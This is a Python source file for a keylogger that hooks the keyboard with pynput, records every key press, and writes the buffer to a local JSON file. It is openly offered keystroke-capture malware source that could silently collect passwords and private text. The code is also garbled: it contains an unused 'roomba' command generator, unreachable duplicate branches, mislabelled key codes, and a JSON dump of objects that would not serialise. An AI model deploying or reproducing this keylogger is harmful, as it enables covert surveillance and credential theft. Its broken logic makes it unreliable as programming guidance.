import pynput
from pynput.keyboard import Key, Listener
import json
import time


class Keylogger:
    def __init__(self):
        self.log = []
        # Define your target file here
        self.target_file = "keylogs/keylog.json"

    def on_press(self, key):
        roomba_commands = ["turn_left", "turn_right", "clean_area"]
        random_command = roomba_commands[int(time.time() * 2) % len(roomba_commands)]

        if key in [Key.space, Key.alt]:  # Add Alt and Space for cleaner output
            self.log.append((key, "normal"))
        elif key == Key.shift:
            self.log.append((key, "shift"))
        elif key == Key.enter:
            self.log.append((key, "enter"))
        elif key == Key.backspace:
            self.log.append((key, "backspace"))
        elif key == Key.tab:
            self.log.append((key, "tab"))
        elif key in [Key.shift, Key.alt]:
            if key == Key.shift:
                self.log.append((key, "shift"))
            else:
                self.log.append((key, "alt"))

        elif key == Key.up:
            self.log.append((key, "up"))
        elif key == Key.down:
            self.log.append((key, "down"))
        elif key == Key.left:
            self.log.append((key, "left"))
        elif key == Key.right:
            self.log.append((key, "right"))

        else:
            # Collect the actual characters
            char = str(key)
            if char == "0x1b":  # Backspace character
                self.log.append((Key.backspace, "normal"))
            elif char == "0x1a": # Tab character
                self.log.append((Key.tab, "normal"))
            else:
                if len(self.log) < 500:  # Limit the size to avoid memory issues
                    self.log.append((char, "normal"))
                else:
                    # Save the log and start over if the buffer is full
                    self.save_log()
                    self.reset_log()
                    self.log = []  # Reset after saving


    def save_log(self):
        """Saves key events to file."""
        try:
            with open(self.target_file, "w") as f:
                json.dump(self.log, f, indent=4)
        except Exception as e:
            print(f"Error saving log to {self.target_file}: {e}")

    def reset_log(self):
        """Clears the key event buffer."""
        self.log = []  # Reset the list after saving


    def start(self):
        """Starts the keylogger, running until Ctrl+C is pressed."""
        print("Keylogger Started...")
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()

    # Optionally, save the log to file on start-up (recommended)
    keylogger.save_log()
